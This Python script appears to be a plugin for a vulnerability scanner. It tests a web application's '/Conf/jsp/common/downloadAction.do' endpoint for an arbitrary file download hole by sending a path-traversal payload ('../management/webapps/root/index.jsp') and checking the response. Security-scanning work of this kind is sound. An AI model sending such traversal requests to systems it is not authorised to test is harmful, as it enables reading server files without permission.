# -*- coding:utf-8 -*-

from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if v2 arbitrary file download vul')
    http = httpparse()
    try:
        path = '/Conf/jsp/common/downloadAction.do?path=../management/webapps/root/index.jsp'
        tm = http.httpreq('GET', protocol, ip, port, path)
        if tm and (tm != None) and tm[0] == 200 and ('index.jsp' in str(tm[2])):
            try:
                path = '/Confspursah/jsp/common/downloadAction.do'
                tmn = http.httpreq('GET', protocol, ip, port, path)
                if tmn and (tmn != None) and tmn[0] == 404:
                    msg = 'There is v2 arbitrary file download vul on url: ' +url+ ' .'
                    number = 'v27'
                    print(msg)
                    return True,url,number,msg
                else:
                    msg = 'There is no v2 arbitrary file download vul on ' +url+ ' .'
                    number = 'v0'
                    return False,url,number,msg
            except Exception as e:
                msg = str(e)
                number = 'v0'
                return False,url,number,msg
        else:
            msg = 'There is no v2 arbitrary file download vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
